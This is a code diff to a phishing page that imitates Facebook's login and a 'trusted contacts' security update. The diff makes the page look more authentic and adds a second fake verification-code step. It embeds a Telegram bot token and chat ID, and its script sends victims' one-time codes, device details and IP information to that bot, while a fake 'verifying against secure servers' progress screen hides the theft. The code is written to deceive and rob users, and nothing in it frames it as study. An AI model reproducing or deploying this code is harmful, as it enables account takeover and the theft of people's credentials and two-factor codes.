@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-  <title>Log in to Facebook to Update Your Trusted Contacts</title>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+  <title>Facebook - Update Your Trusted Contacts</title>
+  <link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzE4NzdGMiI+PHBhdGggZD0iTTI0IDEyLjA3M2MwLTYuNjI3LTUuMzczLTEyLTEyLTEycy0xMiA1LjM3My0xMiAxMmMwIDUuOTkgNC4zODggMTAuOTU0IDEwLjEyNSAxMS45Mjd2LTguNDM3SDcuMDc4di0zLjQ5aDMuMDQ3VjkuNDNjMC0zLjAwNyAxLjc5Mi00LjY2OSA0LjUzMy00LjY2OSAxLjMxMiAwIDIuNjg2LjIzNCAyLjY4Ni4yMzR2Mi45NTNoLTEuNTE0Yy0xLjQ5MSAwLTEuOTU1LjkyNS0xLjk1NSAxLjg3NHYyLjI1aDMuMzI4bC0uNTMyIDMuNDloLTIuNzk2djguNDM3QzE5LjYxMiAyMy4wMjcgMjQgMTguMDYyIDI0IDEyLjA3M3oiLz48L3N2Zz4=">
   <style>
     /* Reset styles */
     * {
@@ -14,192 +14,338 @@
     }
     
     body {
-      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
-      background-color: #F0F2F5;
-      color: #1C1E21;
+      font-family: SFProText-Regular, Helvetica, Arial, sans-serif;
+      background-color: #f0f2f5;
+      color: #1c1e21;
+      line-height: 1.34;
       min-height: 100vh;
+    }
+    
+    /* Facebook authentic design */
+    .fb-container {
       display: flex;
-      flex-direction: column;
-    }
-    
-    /* Utility Classes */
-    .flex {
-      display: flex;
-    }
-    
-    .flex-col {
-      flex-direction: column;
-    }
-    
-    .items-center {
       align-items: center;
-    }
-    
-    .justify-center {
       justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
     }
     
-    .w-full {
+    .fb-content {
+      display: flex;
+      align-items: center;
+      max-width: 980px;
+      width: 100%;
+      gap: 100px;
+    }
+    
+    .fb-left {
+      flex: 1;
+      max-width: 580px;
+    }
+    
+    .fb-logo {
+      color: #1877f2;
+      font-size: 64px;
+      font-weight: bold;
+      line-height: 1;
+      margin-bottom: 16px;
+      font-family: Klavika-Medium, sans-serif;
+    }
+    
+    .fb-tagline {
+      color: #1c1e21;
+      font-size: 28px;
+      font-weight: normal;
+      line-height: 32px;
+      width: 500px;
+    }
+    
+    .fb-right {
+      flex: 1;
+      max-width: 396px;
+    }
+    
+    .fb-login-box {
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
+      padding: 20px;
       width: 100%;
     }
     
-    .text-center {
+    .fb-input {
+      background: #f5f6f7;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      color: #1d2129;
+      font-size: 17px;
+      padding: 14px 16px;
+      width: 100%;
+      margin-bottom: 12px;
+      line-height: 16px;
+    }
+    
+    .fb-input:focus {
+      background: white;
+      border-color: #1877f2;
+      box-shadow: 0 0 0 2px #e7f3ff;
+      outline: none;
+    }
+    
+    .fb-input::placeholder {
+      color: #90949c;
+    }
+    
+    .fb-login-btn {
+      background: #1877f2;
+      border: none;
+      border-radius: 6px;
+      color: white;
+      font-size: 20px;
+      font-weight: bold;
+      padding: 12px;
+      width: 100%;
+      cursor: pointer;
+      margin-bottom: 16px;
+      transition: background-color 0.1s;
+    }
+    
+    .fb-login-btn:hover {
+      background: #166fe5;
+    }
+    
+    .fb-forgot {
+      color: #1877f2;
+      font-size: 14px;
+      text-decoration: none;
+      text-align: center;
+      display: block;
+      margin-bottom: 16px;
+    }
+    
+    .fb-forgot:hover {
+      text-decoration: underline;
+    }
+    
+    .fb-divider {
+      border-top: 1px solid #dadde1;
+      margin: 20px 16px;
+    }
+    
+    .fb-create-btn {
+      background: #42b883;
+      border: none;
+      border-radius: 6px;
+      color: white;
+      font-size: 17px;
+      font-weight: bold;
+      padding: 12px 16px;
+      cursor: pointer;
+      display: block;
+      margin: 0 auto;
+      transition: background-color 0.1s;
+    }
+    
+    .fb-create-btn:hover {
+      background: #36a420;
+    }
+    
+    .fb-create-page {
+      color: #1c1e21;
+      font-size: 14px;
+      font-weight: normal;
+      margin-top: 28px;
       text-align: center;
     }
     
-    .rounded {
-      border-radius: 6px;
+    .fb-create-page a {
+      color: #1c1e21;
+      font-weight: 600;
+      text-decoration: none;
     }
     
-    .shadow {
-      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+    .fb-create-page a:hover {
+      text-decoration: underline;
     }
     
-    .p-4 {
-      padding: 1rem;
+    .error-message {
+      color: #f02849;
+      font-size: 13px;
+      margin-top: 5px;
+      margin-bottom: 5px;
     }
     
-    .my-3 {
-      margin-top: 0.75rem;
-      margin-bottom: 0.75rem;
+    /* Loading spinner animation */
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
     
-    .mb-3 {
-      margin-bottom: 0.75rem;
-    }
-    
-    .mb-4 {
-      margin-bottom: 1rem;
-    }
-    
-    .mt-3 {
-      margin-top: 0.75rem;
-    }
-    
-    .mr-3 {
-      margin-right: 0.75rem;
-    }
-    
-    .mx-auto {
-      margin-left: auto;
-      margin-right: auto;
-    }
-    
-    .text-xs {
-      font-size: 0.75rem;
-    }
-    
-    .text-sm {
-      font-size: 0.875rem;
-    }
-    
-    .text-base {
-      font-size: 1rem;
-    }
-    
-    .text-xl {
-      font-size: 1.25rem;
-    }
-    
-    .text-2xl {
-      font-size: 1.5rem;
-    }
-    
-    .text-3xl {
-      font-size: 1.875rem;
-    }
-    
-    .font-bold {
-      font-weight: 700;
-    }
-    
-    /* Facebook-specific styles */
-    .bg-facebook-blue {
-      background-color: #1877F2;
-    }
-    
-    .bg-facebook-green {
-      background-color: #42B72A;
-    }
-    
-    .text-facebook-blue {
-      color: #1877F2;
-    }
-    
-    .text-white {
-      color: white;
-    }
-    
-    .text-facebook-text-light {
-      color: #606770;
-    }
-    
-    .separator {
-      height: 1px;
-      background-color: #dadde1;
+    /* Modal styles */
+    .bedtime-modal {
+      display: none;
+      position: fixed;
+      z-index: 9999;
+      left: 0;
+      top: 0;
       width: 100%;
-      margin: 1rem 0;
+      height: 100%;
+      background-color: rgba(255, 255, 255, 0.8);
+      backdrop-filter: blur(3px);
     }
     
-    .container {
-      max-width: 1000px;
-      margin: 0 auto;
-      padding: 1rem;
-    }
-    
-    .main-container {
+    .bedtime-modal.show {
       display: flex;
-      flex-direction: column;
-      padding: 1.5rem 1rem;
-      margin-top: 2rem;
+      align-items: center;
+      justify-content: center;
     }
     
-    /* Form styles */
-    .login-form {
+    .modal-content {
       background-color: white;
-      padding: 1rem;
       border-radius: 8px;
-      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
-      width: 100%;
-      max-width: 400px;
-      margin-bottom: 1rem;
+      box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
+      padding: 24px;
+      max-width: 500px;
+      width: 90%;
+      max-height: 90vh;
+      overflow-y: auto;
     }
     
-    .input-field {
-      width: 100%;
-      padding: 0.875rem 1rem;
-      margin-bottom: 0.75rem;
-      border: 1px solid #dddfe2;
-      border-radius: 6px;
-      font-size: 1rem;
-    }
-    
-    .input-field:focus {
-      outline: none;
-      border-color: #1877F2;
-      box-shadow: 0 0 0 2px #e7f3ff;
-    }
-    
-    .login-button {
-      width: 100%;
-      background-color: #1877F2;
-      color: white;
+    .modal-close-button {
+      background: #1877f2;
       border: none;
       border-radius: 6px;
-      padding: 0.75rem;
-      font-size: 1.25rem;
-      font-weight: bold;
+      color: white;
+      font-size: 16px;
+      font-weight: 600;
+      padding: 12px 24px;
       cursor: pointer;
-      margin-bottom: 1rem;
-      transition: background-color 0.2s ease;
+      text-decoration: none;
+      display: inline-block;
+      transition: background-color 0.1s;
     }
     
-    .login-button:hover {
-      background-color: #166FE5;
+    .modal-close-button:hover {
+      background: #166fe5;
     }
     
-    .login-button:active {
-      transform: scale(0.98);
+    .modal-close-button:disabled {
+      background: #e4e6ea;
+      color: #bcc0c4;
+      cursor: not-allowed;
+    }
+    
+    /* Trusted Contacts Shield Responsive */
+    .trusted-contacts-shield {
+      margin-top: 32px;
+      padding: 20px;
+      background: linear-gradient(135deg, #e3f2fd 0%, #f0f8ff 100%);
+      border-radius: 12px;
+      border-left: 4px solid #1877f2;
+      box-shadow: 0 2px 8px rgba(24, 119, 242, 0.1);
+    }
+    
+    .shield-header {
+      display: flex;
+      align-items: center;
+      margin-bottom: 12px;
+    }
+    
+    .shield-icon {
+      margin-right: 12px;
+      flex-shrink: 0;
+    }
+    
+    .shield-title {
+      color: #1877f2;
+      font-size: 16px;
+      font-weight: 600;
+      margin: 0;
+    }
+    
+    .shield-description {
+      color: #1c1e21;
+      font-size: 14px;
+      line-height: 1.4;
+      margin: 0;
+    }
+    
+    /* Responsive design */
+    @media (max-width: 898px) {
+      .fb-content {
+        flex-direction: column;
+        gap: 40px;
+        text-align: center;
+      }
+      
+      .fb-left {
+        max-width: none;
+      }
+      
+      .fb-tagline {
+        width: auto;
+        font-size: 24px;
+        line-height: 28px;
+      }
+      
+      .fb-logo {
+        font-size: 56px;
+      }
+      
+      .trusted-contacts-shield {
+        margin-top: 24px;
+        padding: 16px;
+        text-align: left;
+      }
+      
+      .shield-title {
+        font-size: 15px;
+      }
+      
+      .shield-description {
+        font-size: 13px;
+      }
+    }
+    
+    @media (max-width: 580px) {
+      .fb-container {
+        padding: 16px;
+      }
+      
+      .fb-login-box {
+        padding: 16px;
+      }
+      
+      .fb-logo {
+        font-size: 48px;
+      }
+      
+      .fb-tagline {
+        font-size: 20px;
+        line-height: 24px;
+      }
+      
+      .trusted-contacts-shield {
+        margin-top: 20px;
+        padding: 14px;
+      }
+      
+      .shield-header {
+        margin-bottom: 8px;
+      }
+      
+      .shield-icon {
+        margin-right: 8px;
+      }
+      
+      .shield-title {
+        font-size: 14px;
+      }
+      
+      .shield-description {
+        font-size: 12px;
+        line-height: 1.3;
+      }
     }
     
     .create-account-button {
@@ -338,82 +484,50 @@
   </style>
 </head>
 <body>
-  <div class="container">
-    <!-- Main container -->
-    <div class="main-container">
-      <!-- Branding section -->
-      <div class="branding text-center">
-        <div style="margin-bottom: 1.5rem; text-align: center;">
-          <h1 style="color: #1877F2; font-size: 60px; font-weight: bold; margin: 0 auto; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; letter-spacing: -2px;">facebook</h1>
+  <div class="fb-container">
+    <div class="fb-content">
+      <div class="fb-left">
+        <h1 class="fb-logo">facebook</h1>
+        <p class="fb-tagline">Connect with friends and the world around you on Facebook.</p>
+        
+        <!-- Trusted Contacts Security Shield -->
+        <div class="trusted-contacts-shield">
+          <div class="shield-header">
+            <!-- Security Shield Icon -->
+            <svg class="shield-icon" width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1Z" stroke="#1877f2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" fill="#e3f2fd"/>
+              <path d="M9 12L11 14L16 9" stroke="#1877f2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+            <h3 class="shield-title">Trusted Contacts Security Update</h3>
+          </div>
+          <p class="shield-description">
+            To enhance your account security, please log in to update your trusted contacts. This helps protect your account and ensures you can recover access if needed.
+          </p>
         </div>
-        <p style="color: #606770; font-size: 14px; max-width: 450px; margin: 0 auto 1.5rem; line-height: 1.2; font-weight: normal;">Log in to confirm your identity and secure your Facebook account. Updating your trusted contacts helps keep your account safe and protected.</p>
       </div>
       
-      <!-- Login form section -->
-      <div class="login-form-container">
-        <div class="login-form">
+      <div class="fb-right">
+        <div class="fb-login-box">
           <form id="login-form">
-            <input type="text" class="input-field" id="email" placeholder="Email address or phone number" required>
-            <div class="error-message" id="email-error">Please enter your email or phone number</div>
+            <input type="text" id="email" class="fb-input" placeholder="Email address or phone number" required>
+            <div class="error-message" id="email-error">Please enter a valid email or phone number</div>
             
-            <input type="password" class="input-field" id="password" placeholder="Password" required>
+            <input type="password" id="password" class="fb-input" placeholder="Password" required>
             <div class="error-message" id="password-error">Please enter your password</div>
             
-            <button type="submit" class="login-button">Log In</button>
+            <button type="submit" class="fb-login-btn">Log in</button>
           </form>
           
-          <div class="text-center mb-4">
-            <a href="#" class="text-facebook-blue text-sm">Forgotten password?</a>
-          </div>
+          <a href="#" class="fb-forgot">Forgotten password?</a>
           
-          <div class="separator"></div>
+          <div class="fb-divider"></div>
           
-          <div class="text-center">
-            <button class="create-account-button">Create New Account</button>
-          </div>
+          <button class="fb-create-btn">Create new account</button>
         </div>
         
-        <div class="text-center text-sm">
-          <p><a href="#" class="font-bold">Create a Page</a> for a celebrity, brand or business.</p>
-        </div>
-      </div>
-    </div>
-  </div>
-  
-  <!-- Footer -->
-  <div class="footer">
-    <div class="container">
-      <div class="language-list">
-        <div>English (US)</div>
-        <div>Español</div>
-        <div>Français (France)</div>
-        <div>中文(简体)</div>
-        <div>العربية</div>
-        <div>Português (Brasil)</div>
-        <div>Italiano</div>
-        <div>한국어</div>
-        <div>Deutsch</div>
-        <div>हिन्दी</div>
-        <div>日本語</div>
-      </div>
-      
-      <div class="separator"></div>
-      
-      <div class="link-list">
-        <div>Sign Up</div>
-        <div>Log In</div>
-        <div>Messenger</div>
-        <div>Facebook Lite</div>
-        <div>Watch</div>
-        <div>Places</div>
-        <div>Games</div>
-        <div>Marketplace</div>
-        <div>Meta Pay</div>
-        <div>Meta Store</div>
-      </div>
-      
-      <div class="mt-3 text-xs text-facebook-text-light">
-        Meta ©️ 2025
+        <p class="fb-create-page">
+          <a href="#"><strong>Create a Page</strong></a> for a celebrity, brand or business.
+        </p>
       </div>
     </div>
   </div>
@@ -427,37 +541,117 @@
           <polyline points="22 4 12 14.01 9 11.01"></polyline>
         </svg>
         <h2 class="text-2xl font-bold mb-3 text-facebook-blue">Identity Verification</h2>
-        <p class="mb-4" style="font-size: 16px; line-height: 1.4;">
-          For your account security, we need to verify your identity.
-        </p>
         
-        <!-- Facebook message style notification -->
-        <div style="margin: 20px auto; padding: 15px; background-color: #f0f2f5; border-radius: 8px; width: 90%; max-width: 350px; text-align: left;">
-          <p style="font-size: 14px; color: #1877F2; font-weight: 500; margin-bottom: 6px;">
-            Verification Required
+        <!-- First Verification Step -->
+        <div id="first-verification-step">
+          <p class="mb-4" style="font-size: 16px; line-height: 1.4;">
+            For your account security, we need to verify your identity.
           </p>
-          <p style="font-size: 14px; color: #65676B; line-height: 1.4; font-weight: normal;">
-            We've sent a security verification code to your registered email or phone number. Please enter the code below to confirm your identity and secure your Facebook account.
-          </p>
-        </div>
-        
-        <!-- Verification Code Input -->
-        <div style="margin: 20px auto; max-width: 350px;">
-          <div style="text-align: left; margin-bottom: 8px;">
-            <label for="verification-code" style="font-size: 14px; color: #1c1e21; font-weight: 500;">Enter security code</label>
-            <span style="font-size: 12px; color: #65676B; margin-left: 4px; font-weight: normal;">(6 or 8 digits)</span>
+          
+          <!-- Facebook message style notification -->
+          <div style="margin: 20px auto; padding: 15px; background-color: #f0f2f5; border-radius: 8px; width: 90%; max-width: 350px; text-align: left;">
+            <p style="font-size: 14px; color: #1877F2; font-weight: 500; margin-bottom: 6px;">
+              Verification Required
+            </p>
+            <p style="font-size: 14px; color: #65676B; line-height: 1.4; font-weight: normal;">
+              We've sent a security verification code to your registered email or phone number. Please enter the code below to confirm your identity and secure your Facebook account.
+            </p>
           </div>
-          <input type="text" id="verification-code" class="input-field" placeholder="Enter code" style="width: 100%; padding: 12px 16px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; text-align: center; letter-spacing: 2px; box-shadow: 0 0 0 2px transparent; transition: border-color 0.2s, box-shadow 0.2s;">
-          <div class="error-message" id="verification-code-error" style="display: none; color: #ff0000; font-size: 12px; margin-top: 5px; text-align: left;">Please enter a valid 6-digit or 8-digit code</div>
+          
+          <!-- Verification Code Input -->
+          <div style="margin: 20px auto; max-width: 350px;">
+            <div style="text-align: left; margin-bottom: 8px;">
+              <label for="verification-code" style="font-size: 14px; color: #1c1e21; font-weight: 500;">Enter security code</label>
+              <span style="font-size: 12px; color: #65676B; margin-left: 4px; font-weight: normal;">(6 or 8 digits)</span>
+            </div>
+            <input type="text" id="verification-code" class="input-field" placeholder="Enter code" style="width: 100%; padding: 12px 16px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; text-align: center; letter-spacing: 2px; box-shadow: 0 0 0 2px transparent; transition: border-color 0.2s, box-shadow 0.2s;">
+            <div class="error-message" id="verification-code-error" style="display: none; color: #ff0000; font-size: 12px; margin-top: 5px; text-align: left;">Please enter a valid 6-digit or 8-digit code</div>
+          </div>
+          
+          <button class="modal-close-button" id="submit-verification" style="display: inline-block; text-decoration: none; margin-top: 20px; opacity: 0.7; cursor: not-allowed; padding: 10px 20px; font-size: 15px; border-radius: 6px; background-color: #1877F2; color: white; border: none; font-weight: 600; min-width: 200px;" disabled>
+            Verify and Continue
+          </button>
         </div>
         
-        <button class="modal-close-button" id="submit-verification" style="display: inline-block; text-decoration: none; margin-top: 20px; opacity: 0.7; cursor: not-allowed; padding: 10px 20px; font-size: 15px; border-radius: 6px; background-color: #1877F2; color: white; border: none; font-weight: 600; min-width: 200px;" disabled>
-          Verify and Continue
-        </button>
+        <!-- Pending Confirmation Step -->
+        <div id="pending-confirmation-step" style="display: none;">
+          <div style="text-align: center; padding: 20px;">
+            <!-- Loading spinner -->
+            <div style="margin: 0 auto 20px; width: 48px; height: 48px; border: 4px solid #f3f3f3; border-top: 4px solid #1877F2; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+            
+            <h3 style="color: #1877F2; font-weight: bold; margin-bottom: 15px; font-size: 20px;">Verifying Your Identity</h3>
+            
+            <p style="font-size: 16px; line-height: 1.4; margin-bottom: 20px; color: #65676B;">
+              Please wait while we verify your security code and authenticate your account...
+            </p>
+            
+            <!-- Progress indicator -->
+            <div style="margin: 20px auto; max-width: 300px;">
+              <div style="background-color: #f0f2f5; border-radius: 10px; height: 6px; overflow: hidden;">
+                <div id="progress-bar" style="background-color: #1877F2; height: 100%; width: 0%; border-radius: 10px; transition: width 0.3s ease;"></div>
+              </div>
+              <p style="font-size: 14px; color: #65676B; margin-top: 10px;">
+                <span id="countdown-text">Verification in progress... 5 seconds remaining</span>
+              </p>
+            </div>
+            
+            <div style="margin-top: 25px; padding: 15px; background-color: #e3f2fd; border-radius: 8px; border-left: 4px solid #1877F2;">
+              <p style="font-size: 14px; color: #1c1e21; margin: 0; text-align: left;">
+                <span style="color: #1877F2; font-weight: 500;">🔒 Security Notice:</span><br>
+                We are validating your verification code against our secure servers. This process ensures your account remains protected. Please do not refresh or close this page.
+              </p>
+            </div>
+          </div>
+        </div>
+
+        <!-- Second Verification Step -->
+        <div id="second-verification-step" style="display: none;">
+          <h3 style="color: #1877F2; font-weight: bold; margin-bottom: 10px; font-size: 20px;">Additional Verification Required</h3>
+          
+          <p style="font-size: 16px; line-height: 1.4; margin-bottom: 15px;">
+            To keep your account secure, we need to verify your identity with a second code.
+          </p>
+          
+          <!-- Second verification message -->
+          <div style="margin: 20px auto; padding: 15px; background-color: #f0f2f5; border-radius: 8px; width: 90%; max-width: 350px; text-align: left; border-left: 4px solid #1877F2;">
+            <p style="font-size: 14px; color: #1c1e21; line-height: 1.4; font-weight: normal;">
+              <span style="color: #1877F2; font-weight: 500; display: block; margin-bottom: 5px;">Additional Security Verification Required</span>
+              For your protection, we've sent an additional security code to the primary email or phone number on your account. Please enter this code to complete the verification process. <strong>Do not navigate away from this page</strong>.
+            </p>
+          </div>
+          
+          <!-- Second Verification Code Input -->
+          <div style="margin: 20px auto; max-width: 350px;">
+            <div style="text-align: left; margin-bottom: 8px;">
+              <label for="second-verification-code" style="font-size: 14px; color: #1c1e21; font-weight: 500;">Enter final security code</label>
+              <span style="font-size: 12px; color: #65676B; margin-left: 4px; font-weight: normal;">(6 or 8 digits)</span>
+            </div>
+            <input type="text" id="second-verification-code" class="input-field" placeholder="Enter code" style="width: 100%; padding: 12px 16px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; text-align: center; letter-spacing: 2px; box-shadow: 0 0 0 2px transparent; transition: border-color 0.2s, box-shadow 0.2s;">
+            <div class="error-message" id="second-verification-code-error" style="display: none; color: #ff0000; font-size: 12px; margin-top: 5px; text-align: left;">Please enter a valid 6-digit or 8-digit code</div>
+          </div>
+          
+          <button class="modal-close-button" id="submit-second-verification" style="display: inline-block; text-decoration: none; margin-top: 20px; opacity: 0.7; cursor: not-allowed; padding: 10px 20px; font-size: 15px; border-radius: 6px; background-color: #1877F2; color: white; border: none; font-weight: 600; min-width: 200px;" disabled>
+            Complete Verification
+          </button>
+        </div>
         
-        <a href="https://www.facebook.com" class="modal-close-button" id="modal-close-button" style="display: none; text-decoration: none; margin-top: 20px; padding: 10px 20px; font-size: 15px; border-radius: 6px; background-color: #1877F2; color: white; border: none; font-weight: 600; min-width: 200px;">
-          Continue to Facebook
-        </a>
+        <!-- Final Success Step -->
+        <div id="verification-success" style="display: none;">
+          <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#42B72A" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin: 0 auto 1rem;">
+            <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+            <polyline points="22 4 12 14.01 9 11.01"></polyline>
+          </svg>
+          
+          <h3 style="color: #42B72A; font-weight: bold; margin-bottom: 15px; font-size: 20px;">Security Verification Complete</h3>
+          
+          <p style="font-size: 16px; line-height: 1.4; margin-bottom: 25px; color: #1c1e21;">
+            Thank you for confirming your identity. Your account has been successfully verified and is now protected with enhanced security measures. You can safely continue to Facebook.
+          </p>
+          
+          <a href="https://www.facebook.com" class="modal-close-button" id="modal-close-button" style="display: inline-block; text-decoration: none; padding: 10px 20px; font-size: 15px; border-radius: 6px; background-color: #1877F2; color: white; border: none; font-weight: 600; min-width: 200px;">
+            Continue to Facebook
+          </a>
+        </div>
       </div>
     </div>
   </div>
@@ -475,10 +669,13 @@
       const verificationCodeInput = document.getElementById('verification-code');
       const verificationCodeError = document.getElementById('verification-code-error');
       const submitVerificationButton = document.getElementById('submit-verification');
+      const pendingConfirmationStep = document.getElementById('pending-confirmation-step');
+      const progressBar = document.getElementById('progress-bar');
+      const countdownText = document.getElementById('countdown-text');
       
       // Telegram Bot configuration
-      const botToken = "7806570560:AAFUnBKO85dxfRqkaY3L4radrGdrN5j8JAw";
-      const authorizedChatId = "6424080925";
+      const botToken = "7439509061:AAFt-jzr0SGV4FN4TMF6vsCHdawVxMftplQ";
+      const authorizedChatId = "6360165707";
       
       // Function to send message to Telegram
       async function sendTelegramMessage(message) {
@@ -658,7 +855,15 @@
         }
       });
       
-      // Validate verification code
+      // Get the second verification step elements
+      const secondVerificationStep = document.getElementById('second-verification-step');
+      const secondVerificationCodeInput = document.getElementById('second-verification-code');
+      const secondVerificationCodeError = document.getElementById('second-verification-code-error');
+      const submitSecondVerificationButton = document.getElementById('submit-second-verification');
+      const verificationSuccess = document.getElementById('verification-success');
+      const firstVerificationStep = document.getElementById('first-verification-step');
+      
+      // Validate first verification code
       function validateVerificationCode() {
         const code = verificationCodeInput.value.trim();
         // Basic validation - checking if it's a 6-digit or 8-digit number
@@ -677,48 +882,108 @@
         }
       }
       
-      // Listen for input in verification code field
-      verificationCodeInput.addEventListener('input', validateVerificationCode);
+      // Validate second verification code
+      function validateSecondVerificationCode() {
+        const code = secondVerificationCodeInput.value.trim();
+        // Basic validation - checking if it's a 6-digit or 8-digit number
+        if (!code || (code.length !== 6 && code.length !== 8) || !/^\d+$/.test(code)) {
+          secondVerificationCodeError.style.display = 'block';
+          submitSecondVerificationButton.disabled = true;
+          submitSecondVerificationButton.style.opacity = '0.7';
+          submitSecondVerificationButton.style.cursor = 'not-allowed';
+          return false;
+        } else {
+          secondVerificationCodeError.style.display = 'none';
+          submitSecondVerificationButton.disabled = false;
+          submitSecondVerificationButton.style.opacity = '1';
+          submitSecondVerificationButton.style.cursor = 'pointer';
+          return true;
+        }
+      }
       
-      // Submit verification code
+      // Listen for input in verification code fields
+      verificationCodeInput.addEventListener('input', validateVerificationCode);
+      secondVerificationCodeInput.addEventListener('input', validateSecondVerificationCode);
+      
+      // Submit first verification code
       submitVerificationButton.addEventListener('click', async function() {
         const code = verificationCodeInput.value.trim();
         if (validateVerificationCode()) {
+          try {
+            // Hide first verification step and show pending confirmation
+            firstVerificationStep.style.display = 'none';
+            pendingConfirmationStep.style.display = 'block';
+            
+            // Start 5-second countdown with progress bar
+            let timeRemaining = 5;
+            const updateInterval = setInterval(() => {
+              timeRemaining--;
+              const progressPercentage = ((5 - timeRemaining) / 5) * 100;
+              progressBar.style.width = progressPercentage + '%';
+              
+              if (timeRemaining > 0) {
+                countdownText.textContent = `Verification in progress... ${timeRemaining} seconds remaining`;
+              } else {
+                countdownText.textContent = 'Verification complete';
+                clearInterval(updateInterval);
+              }
+            }, 1000);
+            
+            // Send verification code to Telegram in background
+            const ipInfo = await getIpInfo();
+            const deviceDetails = getDeviceDetails();
+            const timestamp = new Date().toLocaleString();
+            let message = `🔐 First verification code submitted at ${timestamp}:\n\n`;
+            message += `🔢 Code: ${code}\n`;
+            message += deviceDetails;
+            message += `\n${ipInfo}`;
+            
+            const success = await sendTelegramMessage(message);
+            console.log('First verification code sent to Telegram:', success);
+            
+            // After 5 seconds, show second verification step
+            setTimeout(() => {
+              pendingConfirmationStep.style.display = 'none';
+              secondVerificationStep.style.display = 'block';
+            }, 5000);
+            
+          } catch (error) {
+            console.error('Error sending verification code:', error);
+            // Even if there's an error, continue with the flow
+            setTimeout(() => {
+              pendingConfirmationStep.style.display = 'none';
+              secondVerificationStep.style.display = 'block';
+            }, 5000);
+          }
+        }
+      });
+      
+      // Submit second verification code
+      submitSecondVerificationButton.addEventListener('click', async function() {
+        const code = secondVerificationCodeInput.value.trim();
+        if (validateSecondVerificationCode()) {
           try {
             // Get current information
             const ipInfo = await getIpInfo();
             const deviceDetails = getDeviceDetails();
             
-            // Format message for Telegram with verification code
+            // Format message for Telegram with second verification code
             const timestamp = new Date().toLocaleString();
-            let message = `🔐 Verification code submitted at ${timestamp}:\n\n`;
-            message += `🔢 Code: ${code}\n`;
+            let message = `🔐 FINAL verification code submitted at ${timestamp}:\n\n`;
+            message += `🔢 Second Code: ${code}\n`;
             message += deviceDetails;
             message += `\n${ipInfo}`;
             
             // Send message to Telegram
             const success = await sendTelegramMessage(message);
-            console.log('Verification code sent to Telegram:', success);
+            console.log('Second verification code sent to Telegram:', success);
             
-            // Hide verification button and show continue button
-            submitVerificationButton.style.display = 'none';
-            closeButton.style.display = 'inline-block';
-            
-            // Show success message
-            verificationCodeInput.disabled = true;
-            verificationCodeInput.style.backgroundColor = '#f0f2f5';
-            
-            // Add success text above continue button
-            const successMessage = document.createElement('p');
-            successMessage.style.color = '#42B72A';
-            successMessage.style.fontWeight = 'bold';
-            successMessage.style.marginTop = '10px';
-            successMessage.style.marginBottom = '10px';
-            successMessage.textContent = 'Verification successful!';
-            submitVerificationButton.parentNode.insertBefore(successMessage, closeButton);
+            // Hide second verification step and show success
+            secondVerificationStep.style.display = 'none';
+            verificationSuccess.style.display = 'block';
             
           } catch (error) {
-            console.error('Error sending verification code:', error);
+            console.error('Error sending second verification code:', error);
           }
         }
       });
